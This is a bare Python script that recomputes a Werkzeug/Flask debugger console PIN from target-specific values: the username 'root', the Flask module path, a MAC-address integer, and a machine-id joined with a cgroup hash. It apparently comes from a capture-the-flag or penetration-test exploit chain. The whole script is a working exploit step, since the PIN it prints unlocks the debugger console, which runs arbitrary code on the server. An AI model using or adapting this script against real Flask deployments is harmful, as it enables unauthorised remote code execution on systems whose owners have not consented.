import hashlib
from itertools import chain

probably_public_bits = [
    'root',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.13/site-packages/flask/app.py'
]
private_bits = [
    '2485377892354',
    '4881e7c5-25aa-4699-ac97-2a8235843348' + '2bb2758811cfdb42eadb95ffa3a3c98c2e7d05087ea8f466b6d2289a60982fe7'
]

num = None
rv = None
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode()
    h.update(bit)
h.update(b"cookiesalt")

if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
print(rv)